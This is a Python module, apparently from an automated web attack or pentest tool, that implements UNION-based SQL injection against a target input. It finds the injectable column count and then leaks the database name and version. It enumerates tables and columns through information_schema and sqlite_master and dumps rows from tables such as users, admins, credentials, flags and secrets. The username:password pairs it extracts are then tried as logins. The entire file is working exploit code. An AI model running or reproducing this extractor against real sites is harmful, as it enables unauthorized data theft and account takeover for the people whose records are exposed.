from __future__ import annotations

import secrets

from ravage.web_core.proof_recognizer import recognize_proofs

from .auth import _credential_pairs_from_rows
from .common import _dedupe, _prioritize
from .context import ExtractorContext
from .models import (
    COMMON_COLUMNS,
    COMMON_TABLES,
    FAST_CREDENTIAL_TABLES,
    UNION_RESERVE_BUDGET,
    _UnionPrimitive,
)
from .sql_helpers import (
    _extract_tilde_value,
    _extract_visible_union_value,
    _fallback_columns_for_table,
    _mysql_expr,
    _prefixes,
    _schema_match_expr,
    _split_sql_items,
    _sqlite_expr,
    _sql_hex_string,
    _sql_string_literal,
    _union_marker_is_executed,
    _union_placeholder_values,
    _union_select_payload,
    _useful_data_value,
)


class UnionBasedMixin(ExtractorContext):
    def _find_union_primitive(self, target: dict[str, object]) -> _UnionPrimitive | None:
        marker = f"RVUNION{secrets.token_hex(3)}"
        input_name = str(target.get("input") or "")
        for prefix in _prefixes(self.baseline_value(input_name)):
            for column_count in range(1, 9):
                # Put a distinct marker in every column. One request now tests
                # both the column count and which result column is rendered;
                # the previous one-marker-at-a-time loop could exhaust its
                # budget on the first quote context before trying `')`.
                markers = [f"{marker}_{index}" for index in range(column_count)]
                values = [f"'{value}'" for value in markers]
                for style in ("comment", "space"):
                    payload = _union_select_payload(prefix, values, style=style)
                    response = self._send(target, payload, phase="union_probe", expr=marker)
                    if response is None:
                        return None
                    marker_index = _executed_union_marker_index(
                        response.body,
                        payload=payload,
                        markers=markers,
                    )
                    if marker_index is None:
                        continue
                    primitive = _UnionPrimitive(
                        target,
                        prefix,
                        column_count,
                        marker_index,
                        payload,
                        style,
                    )
                    self.findings.append(
                        {
                            "type": "sql_union_primitive",
                            "phase": "union_probe",
                            "target": self.target_brief(target),
                            "columns": column_count,
                            "marker_index": marker_index,
                            "payload": payload,
                            "style": style,
                        }
                    )
                    return primitive
        return None


    def _extract_union_based(self, primitive: _UnionPrimitive) -> None:
        direct = self._union_direct_common_values(primitive)
        login_findings = self._try_logins(_credential_pairs_from_rows(direct)[:8]) if direct else []
        if self.proofs:
            self.findings.append(
                {
                    "type": "sql_union_extraction_summary",
                    "phase": "union_extract",
                    "source": "direct_common_values",
                    "target": self.target_brief(primitive.target),
                    "extracted": direct[:24],
                    "login_attempts": login_findings[:12],
                    "proofs": list(self.proofs),
                }
            )
            return
        values = {}
        for label, expr in {
            "database": "database()",
            "version": "version()",
            "sqlite_version": "sqlite_version()",
        }.items():
            value = self._union_leak(primitive, expr)
            if value:
                values[label] = value
        if values:
            self.findings.append(
                {
                    "type": "sql_union_scalar_leaks",
                    "phase": "union_extract",
                    "target": self.target_brief(primitive.target),
                    "values": values,
                }
            )
        tables = self._union_tables(primitive)
        columns_by_table = self._union_columns(primitive, tables, values.get("database", ""))
        extracted = direct + self._union_values(primitive, tables, columns_by_table)
        if not login_findings:
            login_findings = self._try_logins(_credential_pairs_from_rows(extracted)[:8]) if extracted else []
        if tables or columns_by_table or extracted or login_findings:
            self.findings.append(
                {
                    "type": "sql_union_extraction_summary",
                    "phase": "union_extract",
                    "target": self.target_brief(primitive.target),
                    "tables": tables[:12],
                    "columns": {table: columns[:12] for table, columns in columns_by_table.items()},
                    "extracted": extracted[:24],
                    "login_attempts": login_findings[:12],
                    "proofs": list(self.proofs),
                }
            )


    def _union_direct_common_values(self, primitive: _UnionPrimitive) -> list[dict[str, object]]:
        rows: list[dict[str, object]] = []
        candidates = [
            ("users", "credential_pair", "CONCAT(username,0x3a,password)"),
            ("users", "credential_pair", "CONCAT(user,0x3a,password)"),
            ("users", "credential_pair", "CONCAT(email,0x3a,password)"),
            ("users", "password", "password"),
            ("users", "passwd", "passwd"),
            ("users", "pass", "pass"),
            ("admins", "credential_pair", "CONCAT(username,0x3a,password)"),
            ("accounts", "credential_pair", "CONCAT(username,0x3a,password)"),
            ("credentials", "credential_pair", "CONCAT(username,0x3a,password)"),
            ("flag", "flag", "flag"),
            ("flag", "value", "value"),
            ("flags", "flag", "flag"),
            ("flags", "value", "value"),
            ("secrets", "secret", "secret"),
            ("secrets", "value", "value"),
            ("secret", "value", "value"),
        ]
        seen_values: set[tuple[str, str, str]] = set()
        for table, column, expr in candidates:
            if self.budget <= UNION_RESERVE_BUDGET:
                break
            values = _union_placeholder_values(primitive.column_count)
            values[primitive.marker_index] = expr
            payload = _union_select_payload(primitive.prefix, values, from_table=table, style=primitive.style)
            response = self._send(primitive.target, payload, phase="union_extract", expr=f"{table}.{column}")
            if response is None:
                break
            value = _extract_visible_union_value(response.body, payload=payload)
            if not _useful_data_value(value):
                continue
            key = (table, column, value)
            if key in seen_values:
                continue
            seen_values.add(key)
            row = {"table": table, "column": column, "row": 0, "value": value, "source": "direct_union"}
            rows.append(row)
            self._register_blind_proof(value, primitive.target, "union_extract")
            if self.proofs:
                break
        return rows


    def _union_leak(self, primitive: _UnionPrimitive, expr: str) -> str:
        for wrapped in (f"concat(0x7e,({expr}),0x7e)", f"char(126)||({expr})||char(126)"):
            values = _union_placeholder_values(primitive.column_count)
            values[primitive.marker_index] = wrapped
            payload = _union_select_payload(primitive.prefix, values, style=primitive.style)
            response = self._send(primitive.target, payload, phase="union_extract", expr=expr)
            if response is None:
                return ""
            value = _extract_tilde_value(response.body)
            if _useful_data_value(value):
                return value
        return ""


    def _union_tables(self, primitive: _UnionPrimitive) -> list[str]:
        mysql_tables = self._union_leak(
            primitive,
            "select group_concat(table_name) from information_schema.tables where table_schema=database()",
        )
        sqlite_tables = self._union_leak(
            primitive,
            "select group_concat(name) from sqlite_master where type='table'",
        )
        tables = _split_sql_items(mysql_tables or sqlite_tables)
        if not tables:
            return []
        return _prioritize(tables, COMMON_TABLES)


    def _union_columns(
        self,
        primitive: _UnionPrimitive,
        tables: list[str],
        database_name: str,
    ) -> dict[str, list[str]]:
        columns_by_table: dict[str, list[str]] = {}
        schema_match = _schema_match_expr(database_name)
        for table in _tables_for_union_column_enumeration(tables):
            columns_by_table[table] = self._union_columns_for_table(primitive, table, schema_match)
        return columns_by_table


    def _union_columns_for_table(
        self,
        primitive: _UnionPrimitive,
        table: str,
        schema_match: str,
    ) -> list[str]:
        leak = self._union_mysql_columns(primitive, table, schema_match)
        if not leak:
            leak = self._union_sqlite_columns(primitive, table)

        columns = _split_sql_items(leak)
        if not columns:
            columns = _fallback_columns_for_table(table)

        return _prioritize(columns, COMMON_COLUMNS)


    def _union_mysql_columns(
        self,
        primitive: _UnionPrimitive,
        table: str,
        schema_match: str,
    ) -> str:
        expr = _mysql_columns_expr(schema_match, table)
        return self._union_leak(primitive, expr)


    def _union_sqlite_columns(self, primitive: _UnionPrimitive, table: str) -> str:
        expr = _sqlite_columns_expr(table)
        return self._union_leak(primitive, expr)


    def _union_values(
        self,
        primitive: _UnionPrimitive,
        tables: list[str],
        columns_by_table: dict[str, list[str]],
    ) -> list[dict[str, object]]:
        rows: list[dict[str, object]] = []
        table_order = _tables_for_union_value_extraction(tables)
        for table in table_order[:8]:
            table_rows, found_proof = self._union_values_for_table(primitive, table, columns_by_table)
            rows.extend(table_rows)
            if found_proof:
                return rows
        return rows


    def _union_values_for_table(
        self,
        primitive: _UnionPrimitive,
        table: str,
        columns_by_table: dict[str, list[str]],
    ) -> tuple[list[dict[str, object]], bool]:
        rows: list[dict[str, object]] = []
        columns = _candidate_union_columns(table, columns_by_table)
        max_rows = _max_union_rows_for_table(table)

        for column in columns:
            for row_index in range(max_rows):
                row = self._union_value_row(primitive, table, column, row_index)
                if row is None:
                    continue
                rows.append(row)
                if recognize_proofs(str(row.get("value") or "")):
                    return rows, True
        return rows, False


    def _union_value_row(
        self,
        primitive: _UnionPrimitive,
        table: str,
        column: str,
        row_index: int,
    ) -> dict[str, object] | None:
        value = self._union_row_value(primitive, table, column, row_index)
        if not _useful_data_value(value):
            return None
        return {"table": table, "column": column, "row": row_index, "value": value}


    def _union_row_value(
        self,
        primitive: _UnionPrimitive,
        table: str,
        column: str,
        row_index: int,
    ) -> str:
        value = self._union_leak(primitive, _mysql_expr(table, column, row_index))
        if value:
            return value
        return self._union_leak(primitive, _sqlite_expr(table, column, row_index))


def _tables_for_union_column_enumeration(tables: list[str]) -> list[str]:
    prioritized = _prioritize(tables, COMMON_TABLES)
    return prioritized[:6]


def _mysql_columns_expr(schema_match: str, table: str) -> str:
    return (
        "select group_concat(column_name) from information_schema.columns "
        f"where table_schema={schema_match} and table_name={_sql_hex_string(table)}"
    )


def _sqlite_columns_expr(table: str) -> str:
    return f"select group_concat(name) from pragma_table_info({_sql_string_literal(table)})"


def _tables_for_union_value_extraction(tables: list[str]) -> list[str]:
    if tables:
        deduped = _dedupe(tables)
        return _prioritize(deduped, COMMON_TABLES)
    return list(COMMON_TABLES)


def _candidate_union_columns(
    table: str,
    columns_by_table: dict[str, list[str]],
) -> list[str]:
    columns = columns_by_table.get(table)
    if not columns:
        columns = _fallback_columns_for_table(table)
    prioritized = _prioritize(columns, COMMON_COLUMNS)
    return prioritized[:8]


def _max_union_rows_for_table(table: str) -> int:
    if table.lower() in FAST_CREDENTIAL_TABLES:
        return 2
    return 1


def _executed_union_marker_index(
    body: str,
    *,
    payload: str,
    markers: list[str],
) -> int | None:
    for index, marker in enumerate(markers):
        if _union_marker_is_executed(body, payload=payload, marker=marker):
            return index
    return None
